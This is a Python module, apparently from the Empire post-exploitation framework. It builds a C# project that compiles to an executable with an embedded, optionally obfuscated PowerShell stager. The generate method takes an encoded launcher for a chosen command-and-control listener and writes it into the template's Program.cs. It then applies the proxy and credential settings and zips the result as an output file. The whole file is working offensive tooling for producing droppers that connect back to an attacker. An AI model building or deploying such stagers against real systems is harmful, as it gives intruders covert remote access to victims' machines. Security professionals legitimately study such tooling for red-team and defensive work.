from __future__ import print_function
from builtins import object
from lib.common import helpers
import shutil

class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'C# PowerShell Launcher',

            'Author': ['@elitest'],

            'Description': ('Generate a PowerShell C#  solution with embedded stager code that compiles to an exe'),

            'Comments': [
                'Based on the work of @bneg'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'OutFile' : {
                'Description'   :   'File to output zip to.',
                'Required'      :   True,
                'Value'         :   '/tmp/launcher.src'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        listenerName = self.options['Listener']['Value']

        # staging options
        language = self.options['Language']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        outfile = self.options['OutFile']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listenerName))
            return ""
        else:
            obfuscateScript = False
            if obfuscate.lower() == "true":
                obfuscateScript = True

            if obfuscateScript and "launcher" in obfuscateCommand.lower():
                print(helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the C# stager."))
                return ""
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)

            if launcher == "":
                print(helpers.color("[!] Error in launcher generation."))
                return ""
            else:
                launcherCode = launcher.split(" ")[-1]

                directory = self.mainMenu.installPath + "/data/misc/cSharpTemplateResources/cmd/"
                destdirectory = "/tmp/cmd/"

                shutil.copytree(directory,destdirectory)

                lines = open(destdirectory + 'cmd/Program.cs').read().splitlines()
                lines[19] = "\t\t\tstring stager = \"" + launcherCode + "\";"
                open(destdirectory + 'cmd/Program.cs','w').write('\n'.join(lines))
                shutil.make_archive(outfile,'zip',destdirectory)
                shutil.rmtree(destdirectory)
                return outfile
